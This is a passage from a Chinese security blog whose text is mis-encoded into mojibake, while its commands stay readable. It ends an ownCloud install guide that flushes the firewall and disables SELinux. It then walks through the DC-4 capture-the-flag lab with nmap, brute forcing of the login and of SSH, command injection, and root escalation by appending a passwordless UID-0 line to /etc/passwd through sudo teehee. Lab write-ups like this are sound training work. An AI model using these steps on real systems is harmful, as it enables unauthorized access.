<h2 id="5-é…ç½®é˜²ç«å¢™è§„åˆ™åŠSElinuxæˆ–å…³é—­"><a href="#5-é…ç½®é˜²ç«å¢™è§„åˆ™åŠSElinuxæˆ–å…³é—­" class="headerlink" title="5.é…ç½®é˜²ç«å¢™è§„åˆ™åŠSElinuxæˆ–å…³é—­"></a>5.é…ç½®é˜²ç«å¢™è§„åˆ™åŠSElinuxæˆ–å…³é—­</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --add-service=http</span><br><span class="line">firewall-cmd --permanent --add-service=https</span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">iptables -F</span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>

<h2 id="6-ç§»åŠ¨ç›®å½•"><a href="#6-ç§»åŠ¨ç›®å½•" class="headerlink" title="6.ç§»åŠ¨ç›®å½•"></a>6.ç§»åŠ¨ç›®å½•</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp -a /var/www/html/owncloud/* /var/www/html/</span><br><span class="line">chown -R apache:apache home/</span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure>

<h2 id="7-é…ç½®é¡µé¢"><a href="#7-é…ç½®é¡µé¢" class="headerlink" title="7.é…ç½®é¡µé¢"></a>7.é…ç½®é¡µé¢</h2><h3 id="ï¼ˆ1ï¼‰é…ç½®æ•°æ®åº“ç”¨æˆ·ç­‰"><a href="#ï¼ˆ1ï¼‰é…ç½®æ•°æ®åº“ç”¨æˆ·ç­‰" class="headerlink" title="ï¼ˆ1ï¼‰é…ç½®æ•°æ®åº“ç”¨æˆ·ç­‰"></a>ï¼ˆ1ï¼‰é…ç½®æ•°æ®åº“ç”¨æˆ·ç­‰</h3><img src="/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/image-20201125151255716.png" class>

<h3 id="ï¼ˆ2ï¼‰ç™»å…¥"><a href="#ï¼ˆ2ï¼‰ç™»å…¥" class="headerlink" title="ï¼ˆ2ï¼‰ç™»å…¥"></a>ï¼ˆ2ï¼‰ç™»å…¥</h3><img src="/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/image-20201125151643638.png" class>

]]></content>
      <categories>
        <category>LinuxæœåŠ¡</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-4</title>
    <url>/2020/08/23/DC-4/</url>
    <content><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote>
<p>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
<p>Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.</p>
<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.</p>
<p><strong>DC-3ä¹‹åä¸å†æœ‰æç¤ºä¿¡æ¯ï¼Œåªæœ‰ä¸€ä¸ªæœ€ç»ˆflag</strong></p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-è€è§„çŸ©ä¸Šnmap"><a href="#0x01-è€è§„çŸ©ä¸Šnmap" class="headerlink" title="0x01.è€è§„çŸ©ä¸Šnmap"></a>0x01.è€è§„çŸ©ä¸Šnmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ3å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 21:44 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0020s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 00:0C:29:B7:2E:67 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.15 seconds</span><br></pre></td></tr></table></figure>

<h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å‘ç°å¼€æ”¾äº†22/80ç«¯å£</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># nmap -A 192.168.1.3 -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 21:46 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.3</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:B7:2E:67 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.34 ms 192.168.1.3</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.53 seconds</span><br></pre></td></tr></table></figure>

<h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><p><code>å‘ç°åªæœ‰ä¸€ä¸ªadminç™»å…¥æ¡†</code></p>
<img src="/2020/08/23/DC-4/image-20200823095457714.png" class>

<h2 id="0x04-ä½¿ç”¨bpçˆ†ç ´"><a href="#0x04-ä½¿ç”¨bpçˆ†ç ´" class="headerlink" title="0x04.ä½¿ç”¨bpçˆ†ç ´"></a>0x04.ä½¿ç”¨bpçˆ†ç ´</h2><h3 id="1-æŠ“åŒ…"><a href="#1-æŠ“åŒ…" class="headerlink" title="1.æŠ“åŒ…"></a>1.æŠ“åŒ…</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.3</span><br><span class="line">Content-Length: 29</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.1.3</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.1.3/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: has_js=1; SESS3d56985a7fb178e8eb469ddb59bb6550=6flnn9PeYpt0eXlfkyxJlP9vjJwA3UhQ4nszAdkawro; Drupal.toolbar.collapsed=0; PHPSESSID=cdfml2498srtgu1effus59caj4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=admin</span><br></pre></td></tr></table></figure>

<h3 id="2-çˆ†ç ´å¯†ç "><a href="#2-çˆ†ç ´å¯†ç " class="headerlink" title="2.çˆ†ç ´å¯†ç "></a>2.çˆ†ç ´å¯†ç </h3><img src="/2020/08/23/DC-4/image-20200823100752772.png" class>

<p><code>æ·»åŠ å­—å…¸</code></p>
<blockquote>
<p>å­—å…¸ä¸ºï¼š</p>
<p>/usr/share/john/password.lst</p>
</blockquote>
<img src="/2020/08/23/DC-4/image-20200823100842693.png" class>

<p><code>æ·»åŠ çº¿ç¨‹æ•°</code></p>
<img src="/2020/08/23/DC-4/image-20200823100909253.png" class>

<p><code>çˆ†ç ´ï¼Œå¾—åˆ°adminå¯†ç </code></p>
<img src="/2020/08/23/DC-4/image-20200823101419431.png" class>

<h2 id="0x05-ç™»å…¥"><a href="#0x05-ç™»å…¥" class="headerlink" title="0x05.ç™»å…¥"></a>0x05.ç™»å…¥</h2><p><code>å‘ç°ä¸¤ä¸ªæŒ‰é’®</code></p>
<img src="/2020/08/23/DC-4/image-20200823101705004.png" class>

<p><code>ç‚¹å‡»ï¼ŒæŸ¥çœ‹</code></p>
<img src="/2020/08/23/DC-4/image-20200823101759883.png" class>

<img src="/2020/08/23/DC-4/image-20200823101819698.png" class>

<img src="/2020/08/23/DC-4/image-20200823101834283.png" class>

<h2 id="0x06-ç»§ç»­æŠ“åŒ…ï¼ŒæŸ¥çœ‹å‘½ä»¤æ˜¯å¦‚ä½•æ‰§è¡Œçš„"><a href="#0x06-ç»§ç»­æŠ“åŒ…ï¼ŒæŸ¥çœ‹å‘½ä»¤æ˜¯å¦‚ä½•æ‰§è¡Œçš„" class="headerlink" title="0x06.ç»§ç»­æŠ“åŒ…ï¼ŒæŸ¥çœ‹å‘½ä»¤æ˜¯å¦‚ä½•æ‰§è¡Œçš„"></a>0x06.ç»§ç»­æŠ“åŒ…ï¼ŒæŸ¥çœ‹å‘½ä»¤æ˜¯å¦‚ä½•æ‰§è¡Œçš„</h2><img src="/2020/08/23/DC-4/image-20200823102447148.png" class>

<p><code>æ›´æ¢å…¶ä»–ç³»ç»Ÿå‘½ä»¤ï¼Œå¯ä»¥æ‰§è¡Œï¼Œåˆ¤æ–­å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå¹¶å‘ç°äº†å‡ ä¸ªç”¨æˆ·</code></p>
<img src="/2020/08/23/DC-4/image-20200823102752407.png" class>

<p><code>æŸ¥çœ‹homeç›®å½•</code></p>
<img src="/2020/08/23/DC-4/image-20200823103524956.png" class>

<p><code>æ¯ä¸ªå®¶ç›®å½•éƒ½æŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°ä¸€ä¸ªold-passwords.bak</code></p>
<img src="/2020/08/23/DC-4/image-20200823103748208.png" class>

<p><code>å°†ç”¨æˆ·ä¸å¯†ç ç¼–è¾‘ä¸ºå­—å…¸ç”¨äºçˆ†ç ´</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># ls</span></span><br><span class="line">nmap.A  nmap.sP  old-passwords.bak  users.bak</span><br><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="0x07-sshçˆ†ç ´"><a href="#0x07-sshçˆ†ç ´" class="headerlink" title="0x07.sshçˆ†ç ´"></a>0x07.sshçˆ†ç ´</h2><p><code>ç”±äºå¼€æ”¾äº†sshç«¯å£ï¼Œå¯ä»¥è¿›è¡Œsshçˆ†ç ´</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># hydra -L users.bak -P old-passwords.bak ssh://192.168.1.3 -vV -f -o hydra.ssh</span></span><br></pre></td></tr></table></figure>

<p><code>çˆ†ç ´æˆåŠŸä¸€ä¸ªç”¨æˆ·</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># cat hydra.ssh </span></span><br><span class="line"><span class="comment"># Hydra v9.1 run at 2020-08-22 22:49:20 on 192.168.1.3 ssh (hydra -L users.bak -P old-passwords.bak -vV -f -o hydra.ssh ssh://192.168.1.3)</span></span><br><span class="line">[22][ssh] host: 192.168.1.3   login: jim   password: jibril04</span><br><span class="line">root@JIYE:~/tmp/DC4<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x08-sshç™»å…¥"><a href="#0x08-sshç™»å…¥" class="headerlink" title="0x08.sshç™»å…¥"></a>0x08.sshç™»å…¥</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># ssh jim@192.168.1.3</span></span><br><span class="line">jim@192.168.1.3<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">You have mail.</span></span><br><span class="line"><span class="string">Last login: Sun Aug 23 13:35:56 2020 from 192.168.1.6</span></span><br><span class="line"><span class="string">jim@dc-4:~$ whoami</span></span><br><span class="line"><span class="string">jim</span></span><br><span class="line"><span class="string">jim@dc-4:~$ </span></span><br></pre></td></tr></table></figure>

<p><code>æ£€æŸ¥æ–‡ä»¶ï¼Œå‘ç°ä¸€å°æ¥è‡ªrootçš„é‚®ä»¶</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@dc-4:~$ ls -l</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups</span><br><span class="line">-rw------- 1 jim jim  528 Apr  6  2019 mbox</span><br><span class="line">-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh</span><br><span class="line">jim@dc-4:~$ cat mbox </span><br><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        <span class="keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a <span class="built_in">test</span>.</span><br></pre></td></tr></table></figure>

<p><code>æ ¹æ®æ€è·¯æŸ¥çœ‹è¿˜æœ‰æ²¡æœ‰å…¶ä»–é‚®ä»¶ï¼Œç»“æœå¾—åˆ°charlesçš„å¯†ç </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@dc-4:~$ <span class="built_in">cd</span> /var/mail/</span><br><span class="line">jim@dc-4:/var/mail$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rw-rw---- 1 jim mail 715 Apr  6  2019 jim</span><br><span class="line">jim@dc-4:/var/mail$ </span><br><span class="line">jim@dc-4:/var/mail$ </span><br><span class="line">jim@dc-4:/var/mail$ cat jim </span><br><span class="line">From charles@dc-4 Sat Apr 06 21:15:46 2019</span><br><span class="line">Return-path: &lt;charles@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000</span><br><span class="line">Received: from charles by dc-4 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;charles@dc-4&gt;)</span><br><span class="line">        id 1hCjIX-0000kO-Qt</span><br><span class="line">        <span class="keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Holidays</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;</span><br><span class="line">From: Charles &lt;charles@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">Status: O</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I<span class="string">&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password is:  ^xHhA&amp;hvim0y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">See ya,</span></span><br><span class="line"><span class="string">Charles</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$</span></span><br></pre></td></tr></table></figure>

<h2 id="0x09-ææƒ"><a href="#0x09-ææƒ" class="headerlink" title="0x09.ææƒ"></a>0x09.ææƒ</h2><h3 id="1-ä½¿ç”¨sudo-l"><a href="#1-ä½¿ç”¨sudo-l" class="headerlink" title="1.ä½¿ç”¨sudo -l"></a>1.ä½¿ç”¨sudo -l</h3><p><code>jimç”¨æˆ·ä¸èƒ½ä½¿ç”¨sudo -l</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@dc-4:~$ sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the <span class="built_in">local</span> System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> jim: </span><br><span class="line">Sorry, user jim may not run sudo on dc-4.</span><br><span class="line">jim@dc-4:~$</span><br></pre></td></tr></table></figure>

<h3 id="2-åˆ‡æ¢charlesç”¨æˆ·"><a href="#2-åˆ‡æ¢charlesç”¨æˆ·" class="headerlink" title="2.åˆ‡æ¢charlesç”¨æˆ·"></a>2.åˆ‡æ¢charlesç”¨æˆ·</h3><p><code>å‘ç°å¯ä»¥ä½¿ç”¨teeheeå‘½ä»¤ææƒ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># ssh charles@192.168.1.3</span></span><br><span class="line">charles@192.168.1.3<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">charles@dc-4:~$ sudo -l</span></span><br><span class="line"><span class="string">Matching Defaults entries for charles on dc-4:</span></span><br><span class="line"><span class="string">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User charles may run the following commands on dc-4:</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: /usr/bin/teehee</span></span><br><span class="line"><span class="string">charles@dc-4:~$</span></span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹teeheeå‚æ•°ï¼Œå‘ç°-aå‚æ•°ä¸ºè¿½åŠ æ–‡ä»¶ä¸”ä¸è¦†ç›–</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles@dc-4:~$ teehee --<span class="built_in">help</span></span><br><span class="line">Usage: teehee [OPTION]... [FILE]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, <span class="keyword">do</span> not overwrite</span><br><span class="line">  -i, --ignore-interrupts   ignore interrupt signals</span><br><span class="line">  -p                        diagnose errors writing to non pipes</span><br><span class="line">      --output-error[=MODE]   <span class="built_in">set</span> behavior on write error.  See MODE below</span><br><span class="line">      --<span class="built_in">help</span>     display this <span class="built_in">help</span> and <span class="built_in">exit</span></span><br><span class="line">      --version  output version information and <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">MODE determines behavior with write errors on the outputs:</span><br><span class="line">  <span class="string">&#x27;warn&#x27;</span>         diagnose errors writing to any output</span><br><span class="line">  <span class="string">&#x27;warn-nopipe&#x27;</span>  diagnose errors writing to any output not a pipe</span><br><span class="line">  <span class="string">&#x27;exit&#x27;</span>         <span class="built_in">exit</span> on error writing to any output</span><br><span class="line">  <span class="string">&#x27;exit-nopipe&#x27;</span>  <span class="built_in">exit</span> on error writing to any output not a pipe</span><br><span class="line">The default MODE <span class="keyword">for</span> the -p option is <span class="string">&#x27;warn-nopipe&#x27;</span>.</span><br><span class="line">The default operation when --output-error is not specified, is to</span><br><span class="line"><span class="built_in">exit</span> immediately on error writing to a pipe, and diagnose errors</span><br><span class="line">writing to non pipe outputs.</span><br><span class="line"></span><br><span class="line">GNU coreutils online <span class="built_in">help</span>: &lt;http://www.gnu.org/software/coreutils/&gt;</span><br><span class="line">Full documentation at: &lt;http://www.gnu.org/software/coreutils/tee&gt;</span><br><span class="line">or available locally via: info <span class="string">&#x27;(coreutils) tee invocation&#x27;</span></span><br><span class="line">charles@dc-4:~$ </span><br></pre></td></tr></table></figure>

<h3 id="3-teeheeææƒ"><a href="#3-teeheeææƒ" class="headerlink" title="3.teeheeææƒ"></a>3.teeheeææƒ</h3><p><code>å‘/etc/passwdè¿½åŠ æ–‡ä»¶</code></p>
<blockquote>
<p>/etc/passwdæ–‡ä»¶ä¸€å…±æœ‰7ä¸ªå­—æ®µ</p>
<p>ç¬¬ä¸€ä¸ªå­—æ®µä»£è¡¨ç”¨æˆ·åï¼›</p>
<p>ç¬¬äºŒä¸ªå­—æ®µä»£è¡¨æ˜¯å¦æœ‰å¯†ç ä¿æŠ¤ï¼›</p>
<p>ç¬¬ä¸‰ä¸ªå­—æ®µè¡¨ç¤ºUIDï¼Œä¸º0è¡¨ç¤ºrootç”¨æˆ·ï¼›</p>
<p>ç¬¬å››ä¸ªå­—æ®µè¡¨ç¤ºGIDï¼›</p>
<p>ç¬¬äº”ä¸ªå­—æ®µè¡¨ç¤ºç”¨æˆ·å…¨ç§°ï¼›</p>
<p>ç¬¬å…­ä¸ªå­—æ®µè¡¨ç¤ºç”¨æˆ·å®¶ç›®å½•ï¼›</p>
<p>ç¬¬ä¸ƒä¸ªå­—æ®µè¡¨ç¤ºç”¨ä»€ä¹ˆshellæ¥è§£ææ‰§è¡Œ</p>
</blockquote>
<p><code>ä¸ºrootç”¨æˆ·æ·»åŠ åˆ«å</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles@dc-4:~$ <span class="built_in">echo</span> <span class="string">&quot;fjy::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd</span><br><span class="line">fjy::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">_apt:x:104:65534::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:105:109::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">nginx:x:107:111:nginx user,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash</span><br><span class="line">jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash</span><br><span class="line">sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</span><br><span class="line">Debian-exim:x:108:112::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">fjy::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:~$ </span><br></pre></td></tr></table></figure>

<p><code>ç™»å…¥</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles@dc-4:~$ su fjy</span><br><span class="line">root@dc-4:/home/charles<span class="comment"># cd</span></span><br><span class="line">root@dc-4:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@dc-4:/root<span class="comment"># cat flag.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  <span class="string">&quot;Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;</span><span class="string">&quot;88b 888 &quot;</span>88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      <span 